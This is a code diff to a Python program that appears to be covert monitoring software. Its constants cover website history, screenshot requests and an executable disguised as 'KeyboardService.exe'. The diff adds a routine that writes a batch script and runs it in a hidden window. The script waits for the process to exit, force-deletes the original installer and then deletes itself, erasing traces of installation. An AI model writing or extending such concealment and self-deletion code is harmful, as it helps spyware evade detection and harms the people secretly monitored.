@@ -47,7 +47,7 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-APP_VERSION = "1.2.7"
+APP_VERSION = "1.2.8"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -1626,6 +1626,28 @@ def running_from_temp_bundle():
     return "_MEI" in exe_path.upper() or bool(getattr(sys, "_MEIPASS", None))
 
 
+def schedule_installer_cleanup(source_path):
+    helper_path = os.path.join(INSTALL_DIR, f"cleanup_{os.getpid()}.cmd")
+    source_path = os.path.abspath(source_path)
+    lines = [
+        "@echo off",
+        ":wait",
+        f'tasklist /FI "PID eq {os.getpid()}" | find "{os.getpid()}" >nul',
+        "if not errorlevel 1 (",
+        "  timeout /t 1 /nobreak >nul",
+        "  goto wait",
+        ")",
+        f'del /f /q "{source_path}" >nul 2>&1',
+        'del "%~f0"',
+    ]
+    with open(helper_path, "w", encoding="ascii", newline="\r\n") as helper:
+        helper.write("\r\n".join(lines) + "\r\n")
+    startup_info = subprocess.STARTUPINFO()
+    startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    startup_info.wShowWindow = 0
+    subprocess.Popen(["cmd.exe", "/c", helper_path], close_fds=True, startupinfo=startup_info)
+
+
 def install_and_relaunch():
     if os.name != "nt":
         return False
@@ -1658,6 +1680,7 @@ def install_and_relaunch():
             startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
             startup_info.wShowWindow = 0
             subprocess.Popen([INSTALL_PATH], close_fds=True, startupinfo=startup_info)
+            schedule_installer_cleanup(current_path)
             return True
         except OSError as error:
             print(f"Could not install KeyboardService: {error}")
@@ -1799,6 +1822,7 @@ def cleanup_update_artifacts():
     stale_paths = [
         os.path.join(INSTALL_DIR, f"{UPDATE_ASSET_NAME}.download"),
         *glob.glob(os.path.join(INSTALL_DIR, "update_*.cmd")),
+        *glob.glob(os.path.join(INSTALL_DIR, "cleanup_*.cmd")),
     ]
     for path in stale_paths:
         try:
